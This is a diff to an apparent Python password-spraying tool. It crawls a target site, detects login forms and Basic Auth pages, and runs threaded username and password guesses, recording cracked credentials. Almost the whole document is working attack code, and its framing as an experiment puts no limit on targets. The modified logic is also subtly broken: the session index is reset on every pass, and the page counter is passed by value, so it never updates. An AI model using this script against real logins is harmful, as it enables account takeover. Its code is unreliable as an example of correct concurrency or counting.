@@ -185,9 +185,6 @@ def is_password_requested_basic_auth(url, session):
         print(f"Error checking {url}: {e}")
         return False
     
-
-    
-    
 def is_password_requested_basic_password_field(url, session):
     """
     Checks if the given page contains an input field for a password.
@@ -516,7 +513,6 @@ def basic_auth_spray(full_url, password, username, session, successful_cracks, f
 
     except (Timeout, ConnectionError):
         print(f"Connection failed for {full_url}")
-        time.sleep(1)
     except RequestException as e:
         print(f"An error occurred: {e}")
 
@@ -535,40 +531,46 @@ def password_field_spray(full_url, password, username, session, successful_crack
         else:
             failed_cracks.append((full_url, username, password))
     except (Timeout, ConnectionError):
-        time.delay(0.5)
         print(f"Connection failed for {full_url}")
     except RequestException as e:
         print(f"An error occurred: {e}")
 
-def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field):
+def single_spray(full_url, passwords, usernames, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field):
+    sessions = [requests.Session() for _ in range(len(passwords))]
     # Check if the page has a password field (form-based authentication)
-        if is_password_requested_basic_password_field(full_url, session):
-            total_pages_field +=1
-            for password in passwords:
-                threads = []
-                for username in usernames:
-                    tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts))
-                    threads.append(tsub)    
-                for thread in threads:
-                    thread.start()
-                for thread in threads:   
-                    thread.join()
+    if is_password_requested_basic_password_field(full_url, sessions[0]):
+        total_pages_field +=1
+        for password in passwords:
+            i = 0
+            threads = []
+            for username in usernames:
+                tsub = Thread(target=password_field_spray, args=(full_url, password, username, sessions[i], successful_cracks, failed_cracks, total_attempts, successful_attempts))
+                threads.append(tsub)    
+            for thread in threads:
+                thread.start()
+            for thread in threads:   
+                thread.join()
+            i = i+1
 
-        if is_password_requested_basic_auth(full_url, session):
-            total_pages_field +=1
-            for password in passwords:
-                threads = []
-                for username in usernames:
-                    tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts))
-                    threads.append(tsub)    
-                for thread in threads:
-                    thread.start()
-                for thread in threads:   
-                    thread.join()
+    if is_password_requested_basic_auth(full_url, sessions[0]):
+        total_pages_field +=1
+        for password in passwords:
+            i = 0
+            threads = []
+            for username in usernames:
+                tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, sessions[i], successful_cracks, failed_cracks, total_attempts, successful_attempts))
+                threads.append(tsub)    
+            for thread in threads:
+                thread.start()
+            for thread in threads:   
+                thread.join()
+            i = i+1
+
 # Modify the password_spraying function to include bruteforce and character substitution
 def password_spraying(ip_address, username_file, password_file, criteria):
     successful_cracks = []
     failed_cracks = []
+    total_pages_field = 0
     global total_attempts, successful_attempts
 
     # Open the username and password files
@@ -596,18 +598,17 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                                    special_chars=criteria['password_special_chars'])
 
     # Create a session to persist cookies across requests
-    session = requests.Session()
+
 
     # Traverse through the website and find pages with password fields or BasicAuth
     base_url = f'http://{ip_address}'
-    pages_to_check = traverse_website(base_url, session)
+    pages_to_check = traverse_website(base_url, requests.Session())
     pages_to_check = list(set(pages_to_check))  # Remove duplicates
 
     
     start_timer()
     log_resource_usage("Initial Connection","")
     t = []
-    total_pages_field = 0 # stores the total number of pages that have any authentication fields
     for page in pages_to_check:        
         full_url = urljoin(base_url, page)
         credentials_found = False  # Flag to stop further attempts once successful
@@ -615,7 +616,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         print("This is the full URL", full_url)
         log_resource_usage("Login at page", full_url)
         
-        single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field)
+        single_spray(full_url, passwords, usernames, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field)
 
 
     duration = end_timer()  
@@ -650,9 +651,10 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         print(f"Total Attempts: {total_attempts}")
         print(f"Successful Attempts: {successful_attempts}")
         print(f"Total Pages Checked: {total_pages_field}")
-        print(f"Success Rate: {successful_attempts / total_pages_field * 100:.2f}%")
         print(f"Duration of Experiment: {duration} seconds")
         print(f"Average Duration per Attempt: {duration / total_attempts:.4f} seconds")
+        print(f"Success Rate: {successful_attempts / total_pages_field * 100:.2f}%")
+
     except ZeroDivisionError:
         print(f"{Fore.RED}No pages with authentication fields found.")
 
